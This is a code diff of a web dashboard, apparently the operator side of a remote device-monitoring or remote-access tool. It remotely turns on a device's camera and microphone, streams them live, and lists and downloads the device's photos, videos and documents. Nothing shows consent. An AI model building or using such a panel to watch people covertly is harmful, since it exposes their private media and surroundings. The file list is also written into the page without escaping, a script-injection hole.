@@ -422,6 +422,31 @@
             border-left: 3px solid var(--primary-gold);
         }
 
+        .file-item.selected {
+            background: rgba(212, 175, 55, 0.2);
+            border-left: 3px solid var(--primary-gold);
+        }
+
+        .file-icon {
+            width: 20px;
+            margin-right: 10px;
+            font-size: 16px;
+        }
+
+        .file-info {
+            flex: 1;
+        }
+
+        .file-name {
+            color: var(--text-primary);
+            font-weight: 500;
+        }
+
+        .file-meta {
+            color: var(--text-muted);
+            font-size: 11px;
+        }
+
         /* === ANALYTICS TAB === */
         .analytics-container {
             display: flex;
@@ -685,6 +710,29 @@
             z-index: 100;
         }
 
+        /* === ANIMATIONS === */
+        @keyframes slideIn {
+            from {
+                transform: translateX(400px);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+        
+        @keyframes slideOut {
+            from {
+                transform: translateX(0);
+                opacity: 1;
+            }
+            to {
+                transform: translateX(400px);
+                opacity: 0;
+            }
+        }
+
         /* === RESPONSIVE DESIGN === */
         @media (max-width: 768px) {
             .mobile-toggle {
@@ -917,7 +965,7 @@
                     <span class="info-label">Status:</span>
                     <span id="infoStatus" class="info-value">Standby</span>
                 </div>
-<div class="info-item">
+                <div class="info-item">
                     <span class="info-label">Last Contact:</span>
                     <span id="infoDate" class="info-value">Unknown</span>
                 </div>
@@ -987,6 +1035,15 @@
         let deviceWebSocket = null;
         let isLiveStreaming = false;
         let isAudioStreaming = false;
+        let audioQueue = [];
+        let isPlaying = false;
+        let audioContext = null;
+        let isStreamActive = false;
+        let pollInterval = null;
+
+        // File management variables
+        let foundFiles = [];
+        let selectedFiles = [];
 
         // Performance optimization
         let isLoading = false;
@@ -1054,9 +1111,35 @@
         }
 
         function showError(message) {
-            const errorEl = document.getElementById('errorMsg');
-            errorEl.textContent = message;
-            errorEl.classList.remove('hidden');
+            console.error('Error:', message);
+            
+            // Создаем красивое уведомление
+            const notification = document.createElement('div');
+            notification.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                background: linear-gradient(145deg, #2a0000, #440000);
+                color: var(--danger-red);
+                padding: 15px 20px;
+                border-radius: 8px;
+                border: 1px solid var(--danger-red);
+                z-index: 10000;
+                max-width: 300px;
+                box-shadow: 0 4px 20px rgba(255, 0, 0, 0.3);
+                animation: slideIn 0.3s ease;
+            `;
+            notification.innerHTML = `
+                <strong>⚠️ Error</strong><br>
+                ${message}
+            `;
+            
+            document.body.appendChild(notification);
+            
+            setTimeout(() => {
+                notification.style.animation = 'slideOut 0.3s ease';
+                setTimeout(() => notification.remove(), 300);
+            }, 5000);
         }
 
         function showMainApp() {
@@ -1067,498 +1150,6 @@
             loadDevices();
             startRefreshInterval();
         }
-
-        function displayFileList(data) {
-    const fileListElement = document.getElementById('fileList');
-    fileListElement.innerHTML = '';
-    
-    if (!data || !data.categories) {
-        fileListElement.innerHTML = 
-            '<div style="text-align: center; color: #666; padding: 40px;">No files found</div>';
-        return;
-    }
-    
-    const categories = data.categories;
-    const tabs = ['images', 'videos', 'audio', 'documents'];
-    const icons = {
-        images: '🖼️',
-        videos: '🎬',
-        audio: '🎵',
-        documents: '📄'
-    };
-    
-    // Создаём табы
-    const tabsHtml = tabs.map(tab => 
-        `<button class="btn" onclick="showFileCategory('${tab}')" id="tab-${tab}">
-            ${icons[tab]} ${tab.toUpperCase()} (${categories[tab].length})
-        </button>`
-    ).join('');
-    
-    fileListElement.innerHTML = `
-        <div style="display: flex; gap: 8px; margin-bottom: 15px; flex-wrap: wrap;">
-            ${tabsHtml}
-        </div>
-        <div id="fileContent"></div>
-    `;
-    
-    // Показываем первую категорию
-    window.fileCategories = categories;
-    showFileCategory('images');
-}
-
-function showFileCategory(category) {
-    const content = document.getElementById('fileContent');
-    const files = window.fileCategories[category];
-    
-    document.querySelectorAll('[id^="tab-"]').forEach(btn => {
-        btn.style.background = '';
-    });
-    document.getElementById('tab-' + category).style.background = 'var(--primary-gold)';
-    
-    if (!files || files.length === 0) {
-        content.innerHTML = '<div style="text-align: center; color: #666; padding: 20px;">No files in this category</div>';
-        return;
-    }
-    
-    content.innerHTML = files.map(file => `
-        <div class="file-item" onclick="handleFileClick('${file.path}', '${file.name}', '${file.type}')" style="cursor: pointer;">
-            <div style="margin-right: 10px; font-size: 20px;">${getFileIcon(file.type)}</div>
-            <div style="flex: 1;">
-                <div style="color: var(--text-primary); font-weight: 600;">${file.name}</div>
-                <div style="color: var(--text-muted); font-size: 11px;">
-                    ${file.size} • ${file.date}
-                </div>
-                <div style="color: var(--text-secondary); font-size: 10px; margin-top: 2px;">
-                    ${file.path}
-                </div>
-            </div>
-            <div style="display: flex; gap: 5px;">
-                <button class="icon-btn" onclick="event.stopPropagation(); downloadFile('${file.path}', '${file.name}')" title="Download">⬇</button>
-                <button class="icon-btn" onclick="event.stopPropagation(); previewFile('${file.path}', '${file.name}', '${file.type}')" title="Preview">👁</button>
-            </div>
-        </div>
-    `).join('');
-}
-
-function downloadFile(filePath, fileName) {
-    // Очищаем флаг preview для обычного скачивания
-    window.pendingPreview = null;
-    
-    if (!selectedDeviceId) return;
-    
-    fetch('/api/device/download-file', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            device_id: selectedDeviceId,
-            file_path: filePath,
-            token: token
-        })
-    }).catch(error => {
-        console.error('Download error:', error);
-        alert('Failed to request file');
-    });
-}
-
-function handleFileClick(filePath, fileName, fileType) {
-    // При клике на файл - открываем preview
-    previewFile(filePath, fileName, fileType);
-}
-
-async function previewFile(filePath, fileName, fileType) {
-    if (!selectedDeviceId) return;
-    
-    // Показываем индикатор загрузки
-    const loadingMsg = document.createElement('div');
-    loadingMsg.id = 'file-loading-indicator'; // Добавили ID
-    loadingMsg.style.cssText = 'position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.9); padding: 20px; border-radius: 10px; z-index: 9999; border: 1px solid var(--primary-gold);';
-    loadingMsg.innerHTML = '<div class="loading-spinner"></div><br><span style="color: #fff;">Loading file...</span>';
-    document.body.appendChild(loadingMsg);
-    
-    try {
-        const response = await fetch('/api/device/download-file', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                device_id: selectedDeviceId,
-                file_path: filePath,
-                token: token
-            })
-        });
-        
-        if (response.ok) {
-            window.pendingPreview = { fileName, fileType };
-            
-            // УДАЛЯЕМ индикатор через 30 секунд если файл не пришёл
-            setTimeout(() => {
-                const indicator = document.getElementById('file-loading-indicator');
-                if (indicator) {
-                    indicator.remove();
-                    if (window.pendingPreview) {
-                        alert('File loading timeout. Please try again.');
-                        window.pendingPreview = null;
-                    }
-                }
-            }, 30000);
-        }
-        
-    } catch (error) {
-        console.error('Preview error:', error);
-        const indicator = document.getElementById('file-loading-indicator');
-        if (indicator) indicator.remove();
-        alert('Failed to load file');
-    }
-}
-
-        function base64ToBlob(base64, mimeType) {
-    const binaryString = atob(base64);
-    const bytes = new Uint8Array(binaryString.length);
-    for (let i = 0; i < binaryString.length; i++) {
-        bytes[i] = binaryString.charCodeAt(i);
-    }
-    return new Blob([bytes], { type: mimeType }); // ДОБАВЛЕН mimeType
-}
-        
-function handleFileDownload(fileData) {
-    try {
-        // УДАЛЯЕМ индикатор загрузки
-        const loadingMsg = document.getElementById('file-loading-indicator');
-        if (loadingMsg) {
-            loadingMsg.remove();
-        }
-        
-        const extension = fileData.filename.split('.').pop().toLowerCase();
-        const mimeTypes = {
-            'jpg': 'image/jpeg',
-            'jpeg': 'image/jpeg',
-            'png': 'image/png',
-            'gif': 'image/gif',
-            'webp': 'image/webp',
-            'mp4': 'video/mp4',
-            'mp3': 'audio/mpeg',
-            'pdf': 'application/pdf',
-            'txt': 'text/plain'
-        };
-        
-        const mimeType = mimeTypes[extension] || 'application/octet-stream';
-        const blob = base64ToBlob(fileData.data, mimeType);
-        
-        // Проверяем, это preview или download
-        if (window.pendingPreview) {
-            const url = URL.createObjectURL(blob);
-            
-            const previewWindow = window.open(url, '_blank');
-            
-            if (!previewWindow) {
-                alert('Please allow popups to preview files');
-            }
-            
-            setTimeout(() => URL.revokeObjectURL(url), 60000);
-            
-            window.pendingPreview = null;
-            console.log('✅ File opened for preview:', fileData.filename);
-        } else {
-            // Обычное скачивание
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = fileData.filename;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-            
-            console.log('✅ File downloaded:', fileData.filename);
-            alert(`File downloaded: ${fileData.filename}`);
-        }
-        
-    } catch (error) {
-        console.error('File handling error:', error);
-        const indicator = document.getElementById('file-loading-indicator');
-        if (indicator) indicator.remove();
-        alert('Failed to process file: ' + error.message);
-    }
-}
-
-function getFileIcon(type) {
-    const icons = {
-        image: '🖼️',
-        video: '🎬',
-        audio: '🎵',
-        document: '📄'
-    };
-    return icons[type] || '📁';
-}
-// === WEBSOCKET AND CAMERA FUNCTIONS ===
-
-let audioQueue = [];
-let isPlaying = false;
-let audioContext = null;
-let isStreamActive = false;
-
-function initAudioContext() {
-    if (!audioContext) {
-        audioContext = new (window.AudioContext || window.webkitAudioContext)();
-    }
-}
-
-function muLawDecode(mulaw) {
-    const samples = new Float32Array(mulaw.length);
-    
-    for (let i = 0; i < mulaw.length; i++) {
-        let byte = ~mulaw[i];
-        let sign = (byte & 0x80) ? -1 : 1;
-        let exponent = (byte >> 4) & 0x07;
-        let mantissa = byte & 0x0F;
-        
-        let magnitude = ((mantissa << 3) + 0x84) << exponent;
-        magnitude = magnitude << 2;
-        
-        samples[i] = sign * magnitude / 32768.0;
-    }
-    
-    return samples;
-}
-
-function playAudioData(base64Data) {
-    try {
-        initAudioContext();
-        
-        const binaryString = atob(base64Data);
-        const bytes = new Uint8Array(binaryString.length);
-        for (let i = 0; i < binaryString.length; i++) {
-            bytes[i] = binaryString.charCodeAt(i);
-        }
-
-        // PCM 16-bit signed → Float32
-        const samples = new Float32Array(bytes.length / 2);
-        const dataView = new DataView(bytes.buffer);
-        
-        for (let i = 0; i < samples.length; i++) {
-            const int16 = dataView.getInt16(i * 2, true);
-            samples[i] = int16 / 32768.0;
-        }
-
-        audioQueue.push(samples);
-        
-        if (!isPlaying) {
-            processAudioQueue();
-        }
-
-    } catch (err) {
-        console.error("Audio decode error:", err);
-    }
-}
-
-function processAudioQueue() {
-    if (audioQueue.length === 0) {
-        isPlaying = false;
-        return;
-    }
-    
-    isPlaying = true;
-    const samples = audioQueue.shift();
-    
-    const buffer = audioContext.createBuffer(1, samples.length, 16000);
-    const channel = buffer.getChannelData(0);
-    channel.set(samples);
-
-    const source = audioContext.createBufferSource();
-    source.buffer = buffer;
-    source.connect(audioContext.destination);
-    source.onended = () => processAudioQueue();
-    
-    try {
-        source.start();
-    } catch (e) {
-        console.error("Audio play error:", e);
-        processAudioQueue();
-    }
-}
-
-function displayLiveImage(base64Data) {
-    if (!isStreamActive) return;
-    
-    const canvas = document.getElementById('imageCanvas');
-    if (!canvas) return;
-    
-    const ctx = canvas.getContext('2d');
-    
-    const img = new Image();
-    img.onload = function() {
-        canvas.width = img.width || 640;
-        canvas.height = img.height || 480;
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-        ctx.drawImage(img, 0, 0);
-    };
-    img.src = 'data:image/jpeg;base64,' + base64Data;
-}
-
-async function toggleLiveStream() {
-    if (!selectedDeviceId || !deviceWebSocket) {
-        showError('Not connected to device');
-        return;
-    }
-    
-    const btn = document.getElementById('liveStreamBtn');
-    
-    if (!isLiveStreaming) {
-        isStreamActive = true;
-        await sendDeviceCommand('START_LIVE_STREAM');
-        isLiveStreaming = true;
-        btn.textContent = '⏹ STOP CAM';
-        btn.style.background = 'var(--danger-red)';
-        document.getElementById('streamStatus').textContent = 'Streaming';
-    } else {
-        isStreamActive = false;
-        await sendDeviceCommand('STOP_LIVE_STREAM');
-        isLiveStreaming = false;
-        btn.textContent = '🔹 LIVE CAM';
-        btn.style.background = '';
-        document.getElementById('streamStatus').textContent = 'Connected';
-        
-        const canvas = document.getElementById('liveCanvas');
-        if (canvas) {
-            const ctx = canvas.getContext('2d');
-            ctx.fillStyle = '#1a1a1a';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = '#666';
-            ctx.font = '20px Arial';
-            ctx.textAlign = 'center';
-            ctx.fillText('Stream stopped', canvas.width / 2, canvas.height / 2);
-        }
-    }
-}
-
-async function toggleAudio() {
-    if (!selectedDeviceId || !deviceWebSocket) return;
-    
-    const btn = document.getElementById('audioBtn');
-    
-    if (!isAudioStreaming) {
-        await sendDeviceCommand('START_AUDIO');
-        isAudioStreaming = true;
-        btn.textContent = '🔇 MUTE';
-        btn.style.background = 'var(--success-green)';
-    } else {
-        await sendDeviceCommand('STOP_AUDIO');
-        isAudioStreaming = false;
-        btn.textContent = '🎤 AUDIO';
-        btn.style.background = '';
-        
-        audioQueue = [];
-        isPlaying = false;
-        if (audioContext) {
-            await audioContext.close();
-            audioContext = null;
-        }
-    }
-}
-
-async function switchCamera() {
-    if (!selectedDeviceId) return;
-    await sendDeviceCommand('SWITCH_CAMERA');
-}
-
-async function emergencyStop() {
-    if (!selectedDeviceId) return;
-    
-    isStreamActive = false;
-    await sendDeviceCommand('STOP_LIVE_STREAM');
-    await sendDeviceCommand('STOP_AUDIO');
-    
-    isLiveStreaming = false;
-    isAudioStreaming = false;
-    
-    audioQueue = [];
-    isPlaying = false;
-    if (audioContext) {
-        await audioContext.close();
-        audioContext = null;
-    }
-    
-    const canvas = document.getElementById('liveCanvas');
-    if (canvas) {
-        const ctx = canvas.getContext('2d');
-        ctx.fillStyle = '#1a1a1a';
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-    }
-    
-    document.getElementById('liveStreamBtn').textContent = '🔹 LIVE CAM';
-    document.getElementById('liveStreamBtn').style.background = '';
-    document.getElementById('audioBtn').textContent = '🎤 AUDIO';
-    document.getElementById('audioBtn').style.background = '';
-    document.getElementById('streamStatus').textContent = 'Connected';
-}
-
-async function sendDeviceCommand(command) {
-    try {
-        const response = await fetch('/api/device/command', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                device_id: selectedDeviceId,
-                command: command,
-                token: token
-            })
-        });
-        
-        if (!response.ok) {
-            throw new Error('Command failed');
-        }
-        
-        console.log('Command sent:', command);
-        
-    } catch (error) {
-        console.error('Failed to send command:', error);
-        showError('Command failed: ' + command);
-    }
-}
-
-function enableCameraControls() {
-    document.getElementById('liveStreamBtn').disabled = false;
-    document.getElementById('audioBtn').disabled = false;
-    document.getElementById('switchBtn').disabled = false;
-    document.getElementById('stopBtn').disabled = false;
-}
-
-function disableCameraControls() {
-    document.getElementById('liveStreamBtn').disabled = true;
-    document.getElementById('audioBtn').disabled = true;
-    document.getElementById('switchBtn').disabled = true;
-    document.getElementById('stopBtn').disabled = true;
-}
-
-        // === FILE SYSTEM FUNCTIONS ===
-        async function loadDeviceFiles() {
-    if (!selectedDeviceId || !token) {
-        alert('Please select a device first');
-        return;
-    }
-    
-    document.getElementById('fileList').innerHTML = 
-        '<div style="text-align: center; padding: 40px;"><div class="loading-spinner"></div><br>Loading files...</div>';
-    
-    console.log('Requesting files for device:', selectedDeviceId);
-    
-    try {
-        const response = await fetch(`/api/device/${selectedDeviceId}/files/${token}`);
-        console.log('Files response:', response.status);
-        
-        if (!response.ok) throw new Error('Failed to load files');
-        
-        const data = await response.json();
-        console.log('Files received:', data);
-        
-        displayFileList(data);
-        
-    } catch (error) {
-        console.error('Error loading files:', error);
-        document.getElementById('fileList').innerHTML = 
-            '<div style="text-align: center; color: var(--danger-red); padding: 40px;">Failed to load files. Device may be offline.</div>';
-    }
-}
-
         // === MAP INITIALIZATION ===
         function initMap() {
             if (map) return;
@@ -1730,6 +1321,7 @@ function disableCameraControls() {
             await loadDeviceData(deviceId);
             connectToDevice(deviceId);
             loadDeviceFiles();
+            enableCameraControls();
         }
 
         async function loadDeviceData(deviceId) {
@@ -1779,6 +1371,741 @@ function disableCameraControls() {
             }
         }
 
+        // === WEBSOCKET CONNECTION ===
+        function connectToDevice(deviceId) {
+            if (pollInterval) {
+                clearInterval(pollInterval);
+                pollInterval = null;
+            }
+            
+            selectedDeviceId = deviceId;
+            
+            // ✅ ИСПРАВЛЕНО: Правильное закрытие WebSocket
+            if (deviceWebSocket) {
+                deviceWebSocket.onclose = () => {
+                    createWebSocketConnection(deviceId);
+                };
+                deviceWebSocket.close();
+                return;
+            }
+            
+            createWebSocketConnection(deviceId);
+        }
+
+        function createWebSocketConnection(deviceId) {
+            const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsHost = window.location.host;
+            const wsUrl = `${wsProtocol}//${wsHost}/ws/live`;
+            
+            console.log('Connecting to WebSocket:', wsUrl);
+            
+            deviceWebSocket = new WebSocket(wsUrl);
+            
+            deviceWebSocket.onopen = () => {
+                console.log('✅ WebSocket connected');
+                document.getElementById('streamStatus').textContent = 'Connected';
+                document.getElementById('streamStatus').style.color = 'var(--success-green)';
+                enableCameraControls();
+            };
+            
+            deviceWebSocket.onmessage = (event) => {
+                try {
+                    const data = JSON.parse(event.data);
+                    
+                    if (data.deviceId && data.deviceId !== selectedDeviceId) {
+                        return;
+                    }
+                    
+                    switch (data.type) {
+                        case 'image':
+                            displayLiveImage(data.data);
+                            break;
+                            
+                        case 'audio':
+                            playAudioData(data.data);
+                            break;
+                            
+                        case 'file_download':
+                            handleFileDownload(data);
+                            break;
+                            
+                        case 'file_list':
+                            displayFileList(data.data);
+                            break;
+                            
+                        default:
+                            console.log('Unknown message type:', data.type);
+                    }
+                } catch (error) {
+                    console.error('Error processing WebSocket message:', error);
+                }
+            };
+            
+            deviceWebSocket.onerror = (error) => {
+                console.error('WebSocket error:', error);
+                document.getElementById('streamStatus').textContent = 'Error';
+                document.getElementById('streamStatus').style.color = 'var(--danger-red)';
+                
+                setTimeout(() => {
+                    if (selectedDeviceId) {
+                        console.log('Retrying WebSocket connection...');
+                        connectToDevice(selectedDeviceId);
+                    }
+                }, 5000);
+            };
+            
+            deviceWebSocket.onclose = () => {
+                console.log('WebSocket disconnected');
+                document.getElementById('streamStatus').textContent = 'HTTP Mode';
+                document.getElementById('streamStatus').style.color = 'orange';
+                
+                if (!pollInterval && selectedDeviceId) {
+                    pollInterval = setInterval(() => {
+                        pollLatestImage(selectedDeviceId);
+                    }, 3000);
+                }
+            };
+        }
+
+        async function pollLatestImage(deviceId) {
+            try {
+                const response = await fetch(`/api/device/${deviceId}/latest-image/${token}`);
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.image) {
+                        displayLiveImage(data.image);
+                    }
+                }
+            } catch (error) {
+                console.error('HTTP polling error:', error);
+            }
+        }
+        // === CAMERA AND AUDIO FUNCTIONS ===
+        function initAudioContext() {
+            if (!audioContext) {
+                audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            }
+        }
+
+        function displayLiveImage(base64Data) {
+            if (!isStreamActive) return;
+            
+            const canvas = document.getElementById('imageCanvas');
+            if (!canvas) return;
+            
+            const ctx = canvas.getContext('2d');
+            
+            const img = new Image();
+            img.onload = function() {
+                canvas.width = img.width || 640;
+                canvas.height = img.height || 480;
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                ctx.drawImage(img, 0, 0);
+            };
+            img.src = 'data:image/jpeg;base64,' + base64Data;
+        }
+
+        function playAudioData(base64Data) {
+            try {
+                initAudioContext();
+                
+                const binaryString = atob(base64Data);
+                const bytes = new Uint8Array(binaryString.length);
+                for (let i = 0; i < binaryString.length; i++) {
+                    bytes[i] = binaryString.charCodeAt(i);
+                }
+
+                const samples = new Float32Array(bytes.length / 2);
+                const dataView = new DataView(bytes.buffer);
+                
+                for (let i = 0; i < samples.length; i++) {
+                    const int16 = dataView.getInt16(i * 2, true);
+                    samples[i] = int16 / 32768.0;
+                }
+
+                audioQueue.push(samples);
+                
+                if (!isPlaying) {
+                    processAudioQueue();
+                }
+
+            } catch (err) {
+                console.error("Audio decode error:", err);
+            }
+        }
+
+        function processAudioQueue() {
+            if (audioQueue.length === 0) {
+                isPlaying = false;
+                return;
+            }
+            
+            isPlaying = true;
+            const samples = audioQueue.shift();
+            
+            const buffer = audioContext.createBuffer(1, samples.length, 16000);
+            const channel = buffer.getChannelData(0);
+            channel.set(samples);
+
+            const source = audioContext.createBufferSource();
+            source.buffer = buffer;
+            source.connect(audioContext.destination);
+            source.onended = () => processAudioQueue();
+            
+            try {
+                source.start();
+            } catch (e) {
+                console.error("Audio play error:", e);
+                processAudioQueue();
+            }
+        }
+
+        async function toggleLiveStream() {
+            if (!selectedDeviceId || !deviceWebSocket) {
+                showError('Not connected to device');
+                return;
+            }
+            
+            const btn = document.getElementById('liveStreamBtn');
+            
+            if (!isLiveStreaming) {
+                isStreamActive = true;
+                await sendDeviceCommand('START_LIVE_STREAM');
+                isLiveStreaming = true;
+                btn.textContent = '⏹ STOP CAM';
+                btn.style.background = 'var(--danger-red)';
+                document.getElementById('streamStatus').textContent = 'Streaming';
+            } else {
+                isStreamActive = false;
+                await sendDeviceCommand('STOP_LIVE_STREAM');
+                isLiveStreaming = false;
+                btn.textContent = '📹 LIVE CAM';
+                btn.style.background = '';
+                document.getElementById('streamStatus').textContent = 'Connected';
+                
+                const canvas = document.getElementById('imageCanvas');
+                if (canvas) {
+                    const ctx = canvas.getContext('2d');
+                    ctx.fillStyle = '#1a1a1a';
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+                }
+            }
+        }
+
+        async function toggleAudio() {
+            if (!selectedDeviceId || !deviceWebSocket) return;
+            
+            const btn = document.getElementById('audioBtn');
+            
+            if (!isAudioStreaming) {
+                await sendDeviceCommand('START_AUDIO');
+                isAudioStreaming = true;
+                btn.textContent = '🔇 MUTE';
+                btn.style.background = 'var(--success-green)';
+            } else {
+                await sendDeviceCommand('STOP_AUDIO');
+                isAudioStreaming = false;
+                btn.textContent = '🎤 AUDIO';
+                btn.style.background = '';
+                
+                audioQueue = [];
+                isPlaying = false;
+                if (audioContext) {
+                    await audioContext.close();
+                    audioContext = null;
+                }
+            }
+        }
+
+        async function switchCamera() {
+            if (!selectedDeviceId) return;
+            await sendDeviceCommand('SWITCH_CAMERA');
+        }
+
+        async function emergencyStop() {
+            if (!selectedDeviceId) return;
+            
+            isStreamActive = false;
+            await sendDeviceCommand('STOP_LIVE_STREAM');
+            await sendDeviceCommand('STOP_AUDIO');
+            
+            isLiveStreaming = false;
+            isAudioStreaming = false;
+            
+            audioQueue = [];
+            isPlaying = false;
+            if (audioContext) {
+                await audioContext.close();
+                audioContext = null;
+            }
+            
+            const canvas = document.getElementById('imageCanvas');
+            if (canvas) {
+                const ctx = canvas.getContext('2d');
+                ctx.fillStyle = '#1a1a1a';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+            }
+            
+            document.getElementById('liveStreamBtn').textContent = '📹 LIVE CAM';
+            document.getElementById('liveStreamBtn').style.background = '';
+            document.getElementById('audioBtn').textContent = '🎤 AUDIO';
+            document.getElementById('audioBtn').style.background = '';
+            document.getElementById('streamStatus').textContent = 'Connected';
+        }
+
+        async function sendDeviceCommand(command) {
+            try {
+                const response = await fetch('/api/device/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        device_id: selectedDeviceId,
+                        command: command,
+                        token: token
+                    })
+                });
+                
+                if (!response.ok) {
+                    throw new Error('Command failed');
+                }
+                
+                console.log('Command sent:', command);
+                
+            } catch (error) {
+                console.error('Failed to send command:', error);
+                showError('Command failed: ' + command);
+            }
+        }
+
+        function enableCameraControls() {
+            document.getElementById('liveStreamBtn').disabled = false;
+            document.getElementById('audioBtn').disabled = false;
+            document.getElementById('switchBtn').disabled = false;
+            document.getElementById('stopBtn').disabled = false;
+        }
+
+        function disableCameraControls() {
+            document.getElementById('liveStreamBtn').disabled = true;
+            document.getElementById('audioBtn').disabled = true;
+            document.getElementById('switchBtn').disabled = true;
+            document.getElementById('stopBtn').disabled = true;
+        }
+
+        // === FILE MANAGEMENT ===
+        async function loadDeviceFiles() {
+            if (!selectedDeviceId || !token) {
+                alert('Please select a device first');
+                return;
+            }
+            
+            document.getElementById('fileList').innerHTML = 
+                '<div style="text-align: center; padding: 40px;"><div class="loading-spinner"></div><br>Loading files...</div>';
+            
+            console.log('Requesting files for device:', selectedDeviceId);
+            
+            try {
+                const response = await fetch(`/api/device/${selectedDeviceId}/files/${token}`);
+                console.log('Files response:', response.status);
+                
+                if (!response.ok) throw new Error('Failed to load files');
+                
+                const data = await response.json();
+                console.log('Files received:', data);
+                
+                displayFileList(data);
+                
+            } catch (error) {
+                console.error('Error loading files:', error);
+                document.getElementById('fileList').innerHTML = 
+                    '<div style="text-align: center; color: var(--danger-red); padding: 40px;">Failed to load files. Device may be offline.</div>';
+            }
+        }
+
+        function displayFileList(data) {
+            const fileListElement = document.getElementById('fileList');
+            fileListElement.innerHTML = '';
+            
+            if (!data || !data.categories) {
+                fileListElement.innerHTML = 
+                    '<div style="text-align: center; color: #666; padding: 40px;">No files found</div>';
+                return;
+            }
+            
+            const categories = data.categories;
+            const tabs = ['images', 'videos', 'audio', 'documents'];
+            const icons = {
+                images: '🖼️',
+                videos: '🎬',
+                audio: '🎵',
+                documents: '📄'
+            };
+            
+            const tabsHtml = tabs.map(tab => 
+                `<button class="btn" onclick="showFileCategory('${tab}')" id="tab-${tab}">
+                    ${icons[tab]} ${tab.toUpperCase()} (${categories[tab].length})
+                </button>`
+            ).join('');
+            
+            fileListElement.innerHTML = `
+                <div style="display: flex; gap: 8px; margin-bottom: 15px; flex-wrap: wrap;">
+                    ${tabsHtml}
+                </div>
+                <div id="fileContent"></div>
+            `;
+            
+            window.fileCategories = categories;
+            showFileCategory('images');
+        }
+
+        function showFileCategory(category) {
+            const content = document.getElementById('fileContent');
+            const files = window.fileCategories[category];
+            
+            document.querySelectorAll('[id^="tab-"]').forEach(btn => {
+                btn.style.background = '';
+            });
+            document.getElementById('tab-' + category).style.background = 'var(--primary-gold)';
+            
+            if (!files || files.length === 0) {
+                content.innerHTML = '<div style="text-align: center; color: #666; padding: 20px;">No files in this category</div>';
+                return;
+            }
+            
+            content.innerHTML = files.map(file => `
+                <div class="file-item" onclick="handleFileClick('${file.path}', '${file.name}', '${file.type}')" style="cursor: pointer;">
+                    <div style="margin-right: 10px; font-size: 20px;">${getFileIcon(file.type)}</div>
+                    <div style="flex: 1;">
+                        <div style="color: var(--text-primary); font-weight: 600;">${file.name}</div>
+                        <div style="color: var(--text-muted); font-size: 11px;">
+                            ${file.size} • ${file.date}
+                        </div>
+                        <div style="color: var(--text-secondary); font-size: 10px; margin-top: 2px;">
+                            ${file.path}
+                        </div>
+                    </div>
+                    <div style="display: flex; gap: 5px;">
+                        <button class="icon-btn" onclick="event.stopPropagation(); downloadFile('${file.path}', '${file.name}')" title="Download">⬇</button>
+                        <button class="icon-btn" onclick="event.stopPropagation(); previewFile('${file.path}', '${file.name}', '${file.type}')" title="Preview">👁</button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function getFileIcon(type) {
+            const icons = {
+                image: '🖼️',
+                video: '🎬',
+                audio: '🎵',
+                document: '📄'
+            };
+            return icons[type] || '📁';
+        }
+
+        function handleFileClick(filePath, fileName, fileType) {
+            previewFile(filePath, fileName, fileType);
+        }
+
+        async function downloadFile(filePath, fileName) {
+            window.pendingPreview = null;
+            
+            if (!selectedDeviceId) return;
+            
+            fetch('/api/device/download-file', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    device_id: selectedDeviceId,
+                    file_path: filePath,
+                    token: token
+                })
+            }).catch(error => {
+                console.error('Download error:', error);
+                alert('Failed to request file');
+            });
+        }
+
+        async function previewFile(filePath, fileName, fileType) {
+            if (!selectedDeviceId) return;
+            
+            const loadingMsg = document.createElement('div');
+            loadingMsg.id = 'file-loading-indicator';
+            loadingMsg.style.cssText = 'position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.9); padding: 20px; border-radius: 10px; z-index: 9999; border: 1px solid var(--primary-gold);';
+            loadingMsg.innerHTML = '<div class="loading-spinner"></div><br><span style="color: #fff;">Loading file...</span>';
+            document.body.appendChild(loadingMsg);
+            
+            try {
+                const response = await fetch('/api/device/download-file', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        device_id: selectedDeviceId,
+                        file_path: filePath,
+                        token: token
+                    })
+                });
+                
+                if (response.ok) {
+                    window.pendingPreview = { fileName, fileType };
+                    
+                    setTimeout(() => {
+                        const indicator = document.getElementById('file-loading-indicator');
+                        if (indicator) {
+                            indicator.remove();
+                            if (window.pendingPreview) {
+                                alert('File loading timeout. Please try again.');
+                                window.pendingPreview = null;
+                            }
+                        }
+                    }, 30000);
+                }
+                
+            } catch (error) {
+                console.error('Preview error:', error);
+                const indicator = document.getElementById('file-loading-indicator');
+                if (indicator) indicator.remove();
+                alert('Failed to load file');
+            }
+        }
+
+        function handleFileDownload(fileData) {
+            try {
+                // ✅ ИСПРАВЛЕНО: Проверка данных
+                if (!fileData || !fileData.data || !fileData.filename) {
+                    console.error('Invalid file data:', fileData);
+                    alert('Invalid file data received');
+                    return;
+                }
+                
+                const loadingMsg = document.getElementById('file-loading-indicator');
+                if (loadingMsg) {
+                    loadingMsg.remove();
+                }
+                
+                const extension = fileData.filename.split('.').pop().toLowerCase();
+                const mimeTypes = {
+                    'jpg': 'image/jpeg',
+                    'jpeg': 'image/jpeg',
